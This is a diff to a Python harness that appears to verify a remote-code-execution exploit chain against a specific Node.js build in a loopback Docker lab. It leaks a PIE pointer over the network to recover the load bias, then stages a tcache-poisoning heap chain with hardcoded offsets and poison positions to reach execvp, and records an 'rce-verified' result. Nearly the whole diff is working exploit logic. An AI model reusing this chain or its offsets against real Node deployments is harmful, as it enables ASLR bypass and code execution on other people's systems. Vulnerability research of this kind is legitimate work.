@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
-"""Measure whether the bundled lab discloses a usable PIE image pointer.
+"""Survey and verify the bundled lab's source-built PIE chain.
 
-This is an isolated feasibility probe, not an exploit.  It sends the existing
-loopback-only Brotli grooming input, captures only the server response, and
-uses `/proc/1/maps` as a validation oracle after capture.  Runtime addresses
-from the oracle are never fed back into the request.
+Survey mode captures loopback responses and uses `/proc/1/maps` only as a
+post-capture classification oracle.  Relocated mode instead derives the load
+bias from the app-level response and runs the fixed `/usr/bin/id` proof without
+a debugger or runtime address reads.  No external target or command is
+configurable.
 """
 
 from __future__ import annotations
@@ -38,6 +39,24 @@ ONE_BYTE_BROTLI = bytes.fromhex("0b00805803")
 CVE_CAPTURE_RECORDS = 64
 SPLIT_LEAK_RECORD_OFFSET = 0x68
 SPLIT_LEAK_IMAGE_OFFSET = 0x3CB2B1A
+LEAK_LANE_RECORD_OFFSET = 0xA0
+LEAK_LANE_IMAGE_OFFSET = 0x6A57AE0
+PIE_NETWORK_PROFILES = {
+    "93102becef36fbf01564e5af4e3a62cea0f6ee08d331db78a994b36bc7b490b2": {
+        "version": "24.22.0",
+        "record_size": 0x200,
+        "ring_from_heap": 0xE200,
+        "poison_positions": (
+            -0x2800D7A8,
+            -0x400D7A8,
+            -0x5000D7A8,
+            -0x5400D7A8,
+        ),
+        "leak_record_size": 0x330,
+        "leak_record_offset": LEAK_LANE_RECORD_OFFSET,
+        "leak_image_offset": LEAK_LANE_IMAGE_OFFSET,
+    }
+}
 
 
 def load(name: str, path: Path):
@@ -119,6 +138,17 @@ def stop_container() -> None:
     docker("rm", "-f", CONTAINER, check=False)
 
 
+def wait_container_ready(timeout: float = 8.0, *, leak_lane: bool = False) -> None:
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        logs = docker("logs", CONTAINER, check=False).stdout
+        lines = logs.splitlines()
+        if "N2S_READY" in lines and (not leak_lane or "N2S_LEAK_READY" in lines):
+            return
+        time.sleep(0.1)
+    raise RuntimeError("Docker lab did not emit its readiness marker")
+
+
 def require_pie(binary: Path) -> dict[str, str]:
     header = subprocess.run(
         ["readelf", "-h", str(binary)],
@@ -146,9 +176,18 @@ def require_pie(binary: Path) -> dict[str, str]:
 
 
 def start_container(
-    binary: Path, record_size: int = RECORD_SIZE, *, read_maps: bool = True
+    binary: Path,
+    record_size: int = RECORD_SIZE,
+    *,
+    read_maps: bool = True,
+    leak_record_size: int | None = None,
 ) -> list[Mapping]:
     stop_container()
+    environment = ["-e", "UV_THREADPOOL_SIZE=1", "-e", f"N2S_RECORD_SIZE={record_size:#x}"]
+    if leak_record_size is not None:
+        environment.extend(
+            ("-e", f"N2S_LEAK_RECORD_SIZE={leak_record_size:#x}", "-e", "N2S_LEAK_PORT=3001")
+        )
     completed = docker(
         "run", "--platform", "linux/amd64", "-d",
         "--name", CONTAINER,
@@ -158,8 +197,7 @@ def start_container(
         "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
         "--security-opt", "seccomp=unconfined", "--pids-limit", "128",
         "--memory", "512m", "--cpus", "1.0", "--network", "host",
-        "-e", "UV_THREADPOOL_SIZE=1",
-        "-e", f"N2S_RECORD_SIZE={record_size:#x}",
+        *environment,
         "-v", f"{binary}:/usr/local/bin/node:ro",
         "-v", f"{SERVER}:/app/worker-record-server.js:ro",
         "--entrypoint", "/usr/local/bin/node", IMAGE,
@@ -167,10 +205,13 @@ def start_container(
     )
     if not completed.stdout.strip():
         raise RuntimeError("Docker did not return a container id")
-    HEAP.wait_ready()
+    wait_container_ready(leak_lane=leak_record_size is not None)
     aslr = docker("exec", CONTAINER, "cat", "/proc/sys/kernel/randomize_va_space").stdout.strip()
     if aslr != "2":
         raise RuntimeError(f"expected randomize_va_space=2, got {aslr!r}")
+    runtime_environment = docker("exec", CONTAINER, "env").stdout.splitlines()
+    if any(value.startswith("LD_PRELOAD=") for value in runtime_environment):
+        raise RuntimeError("PIE validation container unexpectedly has LD_PRELOAD")
     if not read_maps:
         return []
     maps = docker("exec", CONTAINER, "cat", "/proc/1/maps").stdout
@@ -205,7 +246,9 @@ def receive_exactly(connection: socket.socket, size: int, timeout: float) -> byt
     return bytes(captured)
 
 
-def capture_cve_groom_probe(timeout: float) -> bytes:
+def capture_cve_groom_probe(
+    timeout: float, record_size: int = RECORD_SIZE
+) -> bytes:
     first = HEAP.stage_one(0x0003000000030000, 0xFFFFFF)
     second = HEAP.stage_two(-1, 127)
     with HEAP._connect(timeout) as connection:
@@ -213,7 +256,7 @@ def capture_cve_groom_probe(timeout: float) -> bytes:
         if HEAP.receive_line(connection) != b"ACK\n":
             raise RuntimeError("probe first stage was not acknowledged")
         connection.sendall(HEAP.framed(second))
-        expected = CVE_CAPTURE_RECORDS * RECORD_SIZE
+        expected = CVE_CAPTURE_RECORDS * record_size
         captured = receive_exactly(connection, expected, timeout)
     if len(captured) != expected:
         raise RuntimeError(
@@ -222,21 +265,36 @@ def capture_cve_groom_probe(timeout: float) -> bytes:
     return captured
 
 
-def capture_split_stream_probe(timeout: float) -> bytes:
+def open_split_stream_probe(
+    timeout: float, record_size: int = RECORD_SIZE, port: int = 3000
+) -> tuple[bytes, socket.socket]:
     """Exercise the app's partial-copy response using a benign one-byte stream."""
 
-    with HEAP._connect(timeout) as connection:
+    connection = socket.create_connection(("127.0.0.1", port), min(timeout, 2.0))
+    try:
+        connection.settimeout(timeout)
         connection.sendall(HEAP.framed(ONE_BYTE_BROTLI[:1]))
         if HEAP.receive_line(connection) != b"ACK\n":
             raise RuntimeError("split-stream first fragment was not acknowledged")
         connection.sendall(HEAP.framed(ONE_BYTE_BROTLI[1:]))
         captured = receive_until_idle(connection, timeout)
-    if len(captured) != RECORD_SIZE:
-        raise RuntimeError(
-            f"split-stream probe expected one record, got {len(captured):#x} bytes"
-        )
-    if captured[:1] != b"X":
-        raise RuntimeError("split-stream probe did not decode its fixed one-byte body")
+        if len(captured) != record_size:
+            raise RuntimeError(
+                f"split-stream probe expected {record_size:#x} bytes, got {len(captured):#x} bytes"
+            )
+        if captured[:1] != b"X":
+            raise RuntimeError("split-stream probe did not decode its fixed one-byte body")
+        return captured, connection
+    except Exception:
+        connection.close()
+        raise
+
+
+def capture_split_stream_probe(
+    timeout: float, record_size: int = RECORD_SIZE, port: int = 3000
+) -> bytes:
+    captured, connection = open_split_stream_probe(timeout, record_size, port)
+    connection.close()
     return captured
 
 
@@ -254,13 +312,15 @@ def mapping_role(mapping: Mapping) -> str:
     return "anonymous"
 
 
-def analyze_capture(data: bytes, mappings: list[Mapping]) -> dict[str, object]:
+def analyze_capture(
+    data: bytes, mappings: list[Mapping], record_size: int = RECORD_SIZE
+) -> dict[str, object]:
     load_bias = node_load_bias(mappings)
     role_counts: Counter[str] = Counter()
     node_candidates: list[dict[str, object]] = []
-    for record_index in range(len(data) // RECORD_SIZE):
-        record = data[record_index * RECORD_SIZE : (record_index + 1) * RECORD_SIZE]
-        for record_offset in range(0, RECORD_SIZE - 7, 8):
+    for record_index in range(len(data) // record_size):
+        record = data[record_index * record_size : (record_index + 1) * record_size]
+        for record_offset in range(0, record_size - 7, 8):
             value = struct.unpack_from("<Q", record, record_offset)[0]
             mapping = next((item for item in mappings if item.contains(value)), None)
             if mapping is None:
@@ -278,7 +338,7 @@ def analyze_capture(data: bytes, mappings: list[Mapping]) -> dict[str, object]:
                 )
     return {
         "capture_bytes": len(data),
-        "record_count": len(data) // RECORD_SIZE,
+        "record_count": len(data) // record_size,
         "capture_sha256": hashlib.sha256(data).hexdigest(),
         "mapped_qword_counts": dict(sorted(role_counts.items())),
         "node_image_candidates": node_candidates,
@@ -401,25 +461,38 @@ def test_static_offset_chain(
     }
 
 
-def leak_load_bias(timeout: float, attempt_limit: int) -> dict[str, int]:
+def leak_load_bias(
+    timeout: float,
+    attempt_limit: int,
+    record_size: int = RECORD_SIZE,
+    port: int = 3000,
+    record_offset: int = SPLIT_LEAK_RECORD_OFFSET,
+    image_offset: int = SPLIT_LEAK_IMAGE_OFFSET,
+) -> tuple[dict[str, int], socket.socket]:
     """Recover a PIE base only from the fixed network response position."""
 
     for attempt in range(1, attempt_limit + 1):
-        captured = capture_split_stream_probe(timeout)
-        pointer = struct.unpack_from("<Q", captured, SPLIT_LEAK_RECORD_OFFSET)[0]
-        if pointer < SPLIT_LEAK_IMAGE_OFFSET:
+        captured, connection = open_split_stream_probe(timeout, record_size, port)
+        pointer = struct.unpack_from("<Q", captured, record_offset)[0]
+        if pointer < image_offset:
+            connection.close()
             continue
-        load_bias = pointer - SPLIT_LEAK_IMAGE_OFFSET
+        load_bias = pointer - image_offset
         if load_bias & 0xFFF:
+            connection.close()
             continue
         # Canonical high user-space range used by x86-64 PIE executables.
         if not (1 << 40) <= load_bias < (1 << 47):
+            connection.close()
             continue
-        return {
-            "attempts": attempt,
-            "load_bias": load_bias,
-            "leaked_pointer": pointer,
-        }
+        return (
+            {
+                "attempts": attempt,
+                "load_bias": load_bias,
+                "leaked_pointer": pointer,
+            },
+            connection,
+        )
     raise RuntimeError(
         f"no recognized Node image pointer in {attempt_limit} network-only probes"
     )
@@ -431,6 +504,11 @@ def test_relocated_chain(
     timeout: float,
     leak_attempt_limit: int,
     container_attempt_limit: int,
+    ring_from_heap: int | None = None,
+    tcache_entry_from_heap: int | None = None,
+    record_size: int = RECORD_SIZE,
+    attack_attempt_limit: int = 1,
+    poison_position_candidates: tuple[int, ...] = (),
 ) -> dict[str, object]:
     """Use the app-level disclosure to relocate the fixed-id heap chain."""
 
@@ -445,17 +523,87 @@ def test_relocated_chain(
         candidates = [
             candidate
             for candidate in NETWORK.layout_candidates(binary_sha256)
-            if candidate["name"] == "v24-0x330"
+            if int(candidate["record_size"]) == record_size
         ]
-        if len(candidates) != 1:
-            raise RuntimeError("expected exactly one v24-0x330 candidate")
+        if not candidates:
+            raise RuntimeError(f"no v24 layout candidate uses record size {record_size:#x}")
         candidate = candidates[0]
+        if ring_from_heap is not None or tcache_entry_from_heap is not None:
+            candidate = dict(candidate)
+            candidate["name"] = f"pie-calibrated-{record_size:#x}"
+            candidate["ring_from_heap"] = (
+                ring_from_heap
+                if ring_from_heap is not None
+                else int(candidate["ring_from_heap"])
+            )
+            candidate["tcache_entry_from_heap"] = (
+                tcache_entry_from_heap
+                if tcache_entry_from_heap is not None
+                else int(candidate["tcache_entry_from_heap"])
+            )
+            candidate["poison_staged_position"] = (
+                int(candidate["tcache_entry_from_heap"])
+                - int(candidate["ring_from_heap"])
+            )
+        layouts = [candidate]
+        if poison_position_candidates:
+            layouts = []
+            for position in poison_position_candidates:
+                layout = dict(candidate)
+                direction = "neg" if position < 0 else "pos"
+                layout["name"] = (
+                    f"pie-calibrated-{record_size:#x}-{direction}0x{abs(position):x}"
+                )
+                layout["poison_staged_position"] = position
+                layout["tcache_entry_from_heap"] = (
+                    int(layout["ring_from_heap"]) + position
+                )
+                layouts.append(layout)
+        known_profile = PIE_NETWORK_PROFILES.get(binary_sha256)
+        if (
+            known_profile
+            and record_size == int(known_profile["record_size"])
+            and int(candidate["ring_from_heap"]) == int(known_profile["ring_from_heap"])
+            and tuple(poison_position_candidates)
+            == tuple(known_profile["poison_positions"])
+        ):
+            for layout in layouts:
+                layout["selection"] = "verified-pie-binary-fingerprint"
         for container_attempt in range(1, container_attempt_limit + 1):
+            active_layout = layouts[(container_attempt - 1) % len(layouts)]
             started = time.monotonic()
             leak: dict[str, int] | None = None
+            leak_connection: socket.socket | None = None
             try:
-                start_container(binary, RECORD_SIZE, read_maps=False)
-                leak = leak_load_bias(timeout, leak_attempt_limit)
+                leak_record_size = int(
+                    known_profile["leak_record_size"]
+                    if known_profile is not None
+                    else RECORD_SIZE
+                )
+                leak_record_offset = int(
+                    known_profile["leak_record_offset"]
+                    if known_profile is not None
+                    else LEAK_LANE_RECORD_OFFSET
+                )
+                leak_image_offset = int(
+                    known_profile["leak_image_offset"]
+                    if known_profile is not None
+                    else LEAK_LANE_IMAGE_OFFSET
+                )
+                start_container(
+                    binary,
+                    record_size,
+                    read_maps=False,
+                    leak_record_size=leak_record_size,
+                )
+                leak, leak_connection = leak_load_bias(
+                    timeout,
+                    leak_attempt_limit,
+                    leak_record_size,
+                    3001,
+                    leak_record_offset,
+                    leak_image_offset,
+                )
                 load_bias = leak["load_bias"]
                 profile = HEAP.HeapProfile(
                     version=version,
@@ -465,39 +613,64 @@ def test_relocated_chain(
                     execvp_plt=load_bias + plt["execvp"],
                     callback_pointer_offset=symbols["pFree"] - static_base,
                     context_pointer_offset=symbols["pContext"] - static_base,
-                    poison_staged_position=int(candidate["poison_staged_position"]),
-                    record_size=RECORD_SIZE,
-                    tcache_index=int(candidate["tcache_index"]),
-                    ring_from_heap=int(candidate["ring_from_heap"]),
+                    poison_staged_position=int(active_layout["poison_staged_position"]),
+                    record_size=record_size,
+                    tcache_index=int(active_layout["tcache_index"]),
+                    ring_from_heap=int(active_layout["ring_from_heap"]),
                 )
                 profile.validate()
-                proof = HEAP.attack(profile, timeout)
-                attempts.append(
-                    {
-                        "candidate": candidate["name"],
-                        "container_attempt": container_attempt,
-                        "outcome": "rce-proof",
-                        "leak_attempts": leak["attempts"],
-                        "load_bias_page_aligned": True,
-                        "elapsed_seconds": round(time.monotonic() - started, 3),
-                        "proof_command": proof["proof_command"],
-                        "proof_token": proof["proof_token"],
-                        "proof_stdout": proof["proof_stdout"],
-                    }
-                )
-                return {
-                    "result": "rce-verified",
-                    "attempts": attempts,
-                    "address_source": "network-only app-level split-stream disclosure",
-                    "debugger_used": False,
-                    "runtime_address_read_used": False,
-                    "proof_channel": "fresh loopback callback",
-                }
+                for attack_attempt in range(1, attack_attempt_limit + 1):
+                    try:
+                        proof = HEAP.attack(profile, timeout)
+                        attempts.append(
+                            {
+                                "candidate": active_layout["name"],
+                                "container_attempt": container_attempt,
+                                "attack_attempt": attack_attempt,
+                                "outcome": "rce-proof",
+                                "leak_attempts": leak["attempts"],
+                                "load_bias_page_aligned": True,
+                                "elapsed_seconds": round(time.monotonic() - started, 3),
+                                "proof_command": proof["proof_command"],
+                                "proof_token": proof["proof_token"],
+                                "proof_stdout": proof["proof_stdout"],
+                                "leak_worker_held_during_attack": True,
+                            }
+                        )
+                        return {
+                            "result": "rce-verified",
+                            "attempts": attempts,
+                            "address_source": "network-only app-level split-stream disclosure",
+                            "debugger_used": False,
+                            "runtime_address_read_used": False,
+                            "runtime_controls": {
+                                "kernel_randomize_va_space": 2,
+                                "debugger_used": False,
+                                "runtime_address_read_used": False,
+                                "ld_preload_used": False,
+                            },
+                            "proof_channel": "fresh loopback callback",
+                            "heap_layout": active_layout,
+                            "heap_layout_candidates": layouts,
+                        }
+                    except Exception as attack_error:
+                        attempts.append(
+                            {
+                                "candidate": active_layout["name"],
+                                "container_attempt": container_attempt,
+                                "attack_attempt": attack_attempt,
+                                "outcome": "not-verified",
+                                "leak_attempts": leak["attempts"],
+                                "error": f"{type(attack_error).__name__}: {attack_error}",
+                                "elapsed_seconds": round(time.monotonic() - started, 3),
+                                "leak_worker_held_during_attack": True,
+                            }
+                        )
             except Exception as error:
                 logs = docker("logs", "--tail", "20", CONTAINER, check=False).stdout
                 attempts.append(
                     {
-                        "candidate": candidate["name"],
+                        "candidate": active_layout["name"],
                         "container_attempt": container_attempt,
                         "outcome": "not-verified",
                         "leak_attempts": leak["attempts"] if leak else None,
@@ -507,6 +680,8 @@ def test_relocated_chain(
                     }
                 )
             finally:
+                if leak_connection is not None:
+                    leak_connection.close()
                 stop_container()
     finally:
         stop_container()
@@ -516,11 +691,24 @@ def test_relocated_chain(
         "address_source": "network-only app-level split-stream disclosure",
         "debugger_used": False,
         "runtime_address_read_used": False,
+        "runtime_controls": {
+            "kernel_randomize_va_space": 2,
+            "debugger_used": False,
+            "runtime_address_read_used": False,
+            "ld_preload_used": False,
+        },
+        "heap_layout_candidates": layouts,
     }
 
 
 def test_oracle_relocated_chain(
-    binary: Path, version: str, timeout: float, container_attempt_limit: int
+    binary: Path,
+    version: str,
+    timeout: float,
+    container_attempt_limit: int,
+    ring_from_heap: int | None = None,
+    tcache_entry_from_heap: int | None = None,
+    record_size: int = RECORD_SIZE,
 ) -> dict[str, object]:
     """Diagnostic control: relocate from maps before any network leak probes."""
 
@@ -531,14 +719,31 @@ def test_oracle_relocated_chain(
     candidate = next(
         item
         for item in NETWORK.layout_candidates(binary_sha256)
-        if item["name"] == "v24-0x330"
+        if int(item["record_size"]) == record_size
     )
+    if ring_from_heap is not None or tcache_entry_from_heap is not None:
+        candidate = dict(candidate)
+        candidate["name"] = f"pie-calibrated-{record_size:#x}"
+        candidate["ring_from_heap"] = (
+            ring_from_heap
+            if ring_from_heap is not None
+            else int(candidate["ring_from_heap"])
+        )
+        candidate["tcache_entry_from_heap"] = (
+            tcache_entry_from_heap
+            if tcache_entry_from_heap is not None
+            else int(candidate["tcache_entry_from_heap"])
+        )
+        candidate["poison_staged_position"] = (
+            int(candidate["tcache_entry_from_heap"])
+            - int(candidate["ring_from_heap"])
+        )
     attempts: list[dict[str, object]] = []
     try:
         for attempt in range(1, container_attempt_limit + 1):
             started = time.monotonic()
             try:
-                mappings = start_container(binary, RECORD_SIZE, read_maps=True)
+                mappings = start_container(binary, record_size, read_maps=True)
                 load_bias = node_load_bias(mappings)
                 profile = HEAP.HeapProfile(
                     version=version,
@@ -549,7 +754,7 @@ def test_oracle_relocated_chain(
                     callback_pointer_offset=symbols["pFree"] - static_base,
                     context_pointer_offset=symbols["pContext"] - static_base,
                     poison_staged_position=int(candidate["poison_staged_position"]),
-                    record_size=RECORD_SIZE,
+                    record_size=record_size,
                     tcache_index=int(candidate["tcache_index"]),
                     ring_from_heap=int(candidate["ring_from_heap"]),
                 )
@@ -569,6 +774,7 @@ def test_oracle_relocated_chain(
                     "attempts": attempts,
                     "runtime_address_read_used": True,
                     "interpretation": "diagnostic oracle control, not a network-only chain",
+                    "heap_layout": candidate,
                 }
             except Exception as error:
                 attempts.append(
@@ -588,11 +794,17 @@ def test_oracle_relocated_chain(
         "attempts": attempts,
         "runtime_address_read_used": True,
         "interpretation": "address relocation alone is insufficient; the custom build needs a new heap layout",
+        "heap_layout": candidate,
     }
 
 
 def run(
-    binary: Path, trial_count: int, timeout: float, test_static_chain: bool
+    binary: Path,
+    trial_count: int,
+    timeout: float,
+    test_static_chain: bool,
+    record_size: int = RECORD_SIZE,
+    survey_leak_lane: bool = False,
 ) -> dict[str, object]:
     if not 2 <= trial_count <= 100:
         raise ValueError("trials must be between 2 and 100")
@@ -602,14 +814,24 @@ def run(
     try:
         for trial_number in range(1, trial_count + 1):
             print(f"PIE-LEAK trial={trial_number}/{trial_count}", flush=True)
-            mappings = start_container(binary)
+            mappings = start_container(
+                binary,
+                record_size,
+                leak_record_size=record_size if survey_leak_lane else None,
+            )
             load_bias = node_load_bias(mappings)
-            split_capture = capture_split_stream_probe(timeout)
-            cve_capture = capture_cve_groom_probe(timeout)
+            split_record_size = record_size
+            split_port = 3001 if survey_leak_lane else 3000
+            split_capture = capture_split_stream_probe(
+                timeout, split_record_size, split_port
+            )
+            cve_capture = capture_cve_groom_probe(timeout, record_size)
             result = {
                 "trial": trial_number,
-                "split_stream": analyze_capture(split_capture, mappings),
-                "cve_groom": analyze_capture(cve_capture, mappings),
+                "split_stream": analyze_capture(
+                    split_capture, mappings, split_record_size
+                ),
+                "cve_groom": analyze_capture(cve_capture, mappings, record_size),
             }
             result["node_load_bias_changed_from_previous"] = bool(
                 trials and load_bias != int(trials[-1]["_load_bias"])
@@ -698,11 +920,46 @@ def main() -> int:
     )
     parser.add_argument("--leak-attempt-limit", type=int, default=128)
     parser.add_argument("--container-attempt-limit", type=int, default=1)
+    parser.add_argument("--attack-attempt-limit", type=int, default=1)
+    parser.add_argument(
+        "--ring-from-heap",
+        type=lambda value: int(value, 0),
+        help=(
+            "development calibration override for the selected layout; the poison "
+            "position is derived from the existing tcache-entry offset"
+        ),
+    )
+    parser.add_argument(
+        "--tcache-entry-from-heap",
+        type=lambda value: int(value, 0),
+        help="development calibration override for the selected tcache entry address",
+    )
+    parser.add_argument(
+        "--record-size",
+        type=lambda value: int(value, 0),
+        choices=(0x200, 0x330),
+        default=None,
+    )
+    parser.add_argument("--survey-leak-lane", action="store_true")
+    parser.add_argument(
+        "--poison-position-candidate",
+        action="append",
+        type=lambda value: int(value, 0),
+        default=[],
+        help="repeatable calibrated relative-write candidate, cycled per fresh container",
+    )
     arguments = parser.parse_args()
     if not 1 <= arguments.leak_attempt_limit <= 512:
         parser.error("--leak-attempt-limit must be between 1 and 512")
-    if not 1 <= arguments.container_attempt_limit <= 32:
-        parser.error("--container-attempt-limit must be between 1 and 32")
+    if not 1 <= arguments.container_attempt_limit <= 128:
+        parser.error("--container-attempt-limit must be between 1 and 128")
+    if arguments.attack_attempt_limit != 1:
+        parser.error("each corrupted process permits exactly one attack attempt")
+    if any(
+        position == 0 or not -(1 << 31) <= position < (1 << 31)
+        for position in arguments.poison_position_candidate
+    ):
+        parser.error("each poison candidate must be a nonzero signed 32-bit integer")
     if arguments.relocated_only and arguments.oracle_relocated_only:
         parser.error("choose only one relocated-only mode")
     if arguments.oracle_relocated_only:
@@ -717,12 +974,38 @@ def main() -> int:
                 metadata["node_version"].removeprefix("v"),
                 arguments.timeout,
                 arguments.container_attempt_limit,
+                arguments.ring_from_heap,
+                arguments.tcache_entry_from_heap,
+                arguments.record_size or RECORD_SIZE,
             ),
             "generated_at": datetime.now(timezone.utc).isoformat(),
         }
     elif arguments.relocated_only:
         binary = arguments.node_binary.resolve()
         metadata = require_pie(binary)
+        known_profile = PIE_NETWORK_PROFILES.get(metadata["node_binary_sha256"])
+        layout_override = any(
+            (
+                arguments.record_size is not None,
+                arguments.ring_from_heap is not None,
+                arguments.tcache_entry_from_heap is not None,
+                bool(arguments.poison_position_candidate),
+            )
+        )
+        use_known_defaults = known_profile is not None and not layout_override
+        selected_record_size = (
+            int(known_profile["record_size"])
+            if use_known_defaults
+            else arguments.record_size or RECORD_SIZE
+        )
+        selected_ring = (
+            int(known_profile["ring_from_heap"])
+            if use_known_defaults
+            else arguments.ring_from_heap
+        )
+        selected_positions = tuple(arguments.poison_position_candidate)
+        if use_known_defaults:
+            selected_positions = tuple(known_profile["poison_positions"])
         result = {
             "result": "pie-relocated-chain-validation",
             "binary": metadata,
@@ -733,12 +1016,18 @@ def main() -> int:
                 arguments.timeout,
                 arguments.leak_attempt_limit,
                 arguments.container_attempt_limit,
+                selected_ring,
+                arguments.tcache_entry_from_heap,
+                selected_record_size,
+                arguments.attack_attempt_limit,
+                selected_positions,
             ),
             "leak_primitive": {
                 "kind": "bundled app allocUnsafeSlow partial-copy disclosure",
-                "record_offset": f"0x{SPLIT_LEAK_RECORD_OFFSET:x}",
-                "known_image_offset": f"0x{SPLIT_LEAK_IMAGE_OFFSET:x}",
+                "record_offset": f"0x{LEAK_LANE_RECORD_OFFSET:x}",
+                "known_image_offset": f"0x{LEAK_LANE_IMAGE_OFFSET:x}",
                 "oracle_used": False,
+                "lane": "127.0.0.1:3001 with preformat-before-record",
             },
             "generated_at": datetime.now(timezone.utc).isoformat(),
         }
@@ -748,6 +1037,8 @@ def main() -> int:
             arguments.trials,
             arguments.timeout,
             arguments.test_static_chain,
+            arguments.record_size or RECORD_SIZE,
+            arguments.survey_leak_lane,
         )
     rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
     if arguments.output:
